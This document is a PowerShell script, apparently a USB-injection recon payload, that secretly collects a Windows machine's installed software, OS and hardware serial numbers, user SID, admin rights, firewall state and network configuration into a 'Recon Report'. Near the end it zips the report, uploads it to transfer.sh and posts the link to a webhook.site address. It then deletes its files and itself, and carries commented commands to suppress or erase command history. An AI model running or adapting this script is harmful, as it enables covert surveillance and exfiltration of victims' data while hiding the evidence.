# Set-PSReadlineOption -HistorySaveStyle SaveNothing

$ProgramFiles = ls "C:\Program Files" | Out-Null

$ProgramFiles86 = ls "C:\Program Files (x86)" | Out-Null

$Network = ipconfig

###############

$folderDateTime = (get-date).ToString('d/M/y HH-mm-ss')

$userDir = "C:\Users\$env:UserName\Lxq49abEQz"
$lootDir = "C:\Users\$env:UserName\TehYpfKxbn"

New-Item -ItemType Directory -Force -Path $userDir
$fileSaveDir = New-Item -ItemType Directory -Force -Path "$userDir\"

New-Item -ItemType Directory -Force -Path $lootDir
$fileLootDir = New-Item -ItemType Directory -Force -Path "$lootDir\"


$date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"

$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:500px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"

$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/export.html'

$Report = $Report + "<div id=body><h1>Info Report</h1><hr size=2><br><h3> Generated on: $date </h3><br>" 

###################################

$Report =  $Report + '<div id=center><h3> Installed Programs</h3> ' 

$Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)

###################################

$Report = $Report + '</table></div>' 

$SysBootTime = Get-WmiObject Win32_OperatingSystem  
 
$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  
 
$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)  
 
$SerialNo = $SysSerialNo.SerialNumber  
 
$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
 
$SysManufacturer = $SysInfo.Manufacturer  
 
$SysModel = $SysInfo.Model
 
$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption 
 
$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"

$HD = [math]::truncate($disk.Size / 1GB) 

$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) 

$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize 
 
$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) 
 
$SysCpu = Get-WmiObject Win32_Processor | Select Name 
 
$Cpu = $SysCpu.Name 
  
$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber 
 
$HardSerialNo = $HardSerial.SerialNumber 
  
$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name 
 
$graphicsCard = gwmi win32_VideoController |select Name 

$graphics = $graphicsCard.Name 

$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 

$DriveLetter = $CDDrive.Drive 
 
$DriveName = $CDDrive.Caption 

$Disk = $DriveLetter + '\' + $DriveName 

$Firewall = New-Object -com HNetCfg.FwMgr  
 
$FireProfile = $Firewall.LocalPolicy.CurrentProfile  

$FireProfile = $FireProfile.FirewallEnabled
 
$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
 
$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
 
$UserType = $UserInfo.AccountType 

$UserSid = $UserInfo.SID
  
$UserPass = $UserInfo.PasswordRequired 
 
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 

$Execute = Get-ExecutionPolicy
 
$Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr><tr><td>Can execute commands:</td><td>$Execute</td></tr></table></div>"
  

$Report =  $Report + "<div id=right><h3> Network</h3>"

# Definir el contenido del reporte
$cuerpo = $network

# Crear la tabla HTML
$html = "<html><head><style>table {border-collapse: collapse;}th, td {border: 1px solid black;padding: 5px;text-align: left;}</style></head><body>"
$html += "<table><tr><th>Descripcion</th><th>Valor</th></tr>"
$html += $cuerpo -split "`n" | ForEach-Object {
    $campo, $valor = $_ -split ":"
    "<tr><td>$campo</td><td>$valor</td></tr>"
}
$html += "</table></body></html>"



$Report =  $Report + ($html)
$Report = $Report + '</table></div>'


################### VARS

$tamanomane = Get-ChildItem "C:\Program Files" | Where-Object {$_.PSIsContainer} | Select-Object Name, @{Name="Size_MB";Expression={"{0:N2}" -f ((Get-ChildItem $_.FullName -Recurse | Measure-Object -Property Length -Sum).Sum / 1MB)}}

$tamanomane86 = Get-ChildItem "C:\Program Files (x86)" | Where-Object {$_.PSIsContainer} | Select-Object Name, @{Name="Size_MB";Expression={"{0:N2}" -f ((Get-ChildItem $_.FullName -Recurse | Measure-Object -Property Length -Sum).Sum / 1MB)}}


$style = "<style>table td {padding-right: 10px;text-align: left;}#left{float: left;background-color: #C0C0C0;width: 45%;height: 500px;border: 4px solid black;padding: 10px;margin: 10px;overflow: scroll;}#right{background-color: #C0C0C0;float: right;width: 45%;height: 500px;border: 4px solid black;padding: 10px;margin: 10px;overflow: scroll;}</style>"
############################
$Report =  $Report + "<div id=left><h3> C:\Program Files</h3>"

$Report =  $Report + ($tamanomane | ConvertTo-html  Name, Size_MB)
$Report = $Report + '</table></div>' 

$Report =  $Report + "<div id=right><h3> C:\Program Files (x86)</h3>"

$Report =  $Report + ($tamanomane86 | ConvertTo-html  Name, Size_MB)
$Report = $Report + '</table></div>'


############################ Export & Compress

$Report >> $fileSaveDir'/export.html'

function copy-ToZip($fileSaveDir){

$srcdir = $fileSaveDir

$zipfile1 = "$HOME\TehYpfKxbn\export.zip"

$zipFile = $zipfile1

if(-not (test-path($zipFile))) {

set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))

(dir $zipFile).IsReadOnly = $false} 

$shellApplication = new-object -com shell.application

$zipPackage = $shellApplication.NameSpace($zipFile) 

$files = Get-ChildItem -Path $srcdir 

foreach($file in $files) { 

$zipPackage.CopyHere($file.FullName) 

while($zipPackage.Items().Item($file.name) -eq $null){ 

Start-sleep -seconds 1 }}} 

copy-ToZip($fileSaveDir) 



############################ Send

$Url_Download = Invoke-WebRequest -UseBasicParsing -Uri "https://transfer.sh/export.zip" -Method Put -Headers @{"Max-Downloads" = "1"; "Max-Days" = "1"} -InFile "$HOME\TehYpfKxbn\export.zip" | Select-Object -ExpandProperty Content

Invoke-WebRequest -Method POST -UseBasicParsing -Uri "https://webhook.site/7b8c61c4-e058-43dc-9bd9-7d82190cd75e" -Body $Url_Download -ContentType "text/plain" | Out-Null




################# EXITTING

remove-item $fileSaveDir -recurse -Force

remove-item $filelootDir -recurse -Force

Remove-Item $MyINvocation.InvocationName -Force

# Set-PSReadlineOption -HistorySaveStyle SaveIncrementally

# Remove-Item (Get-PSReadlineOption).HistorySavePath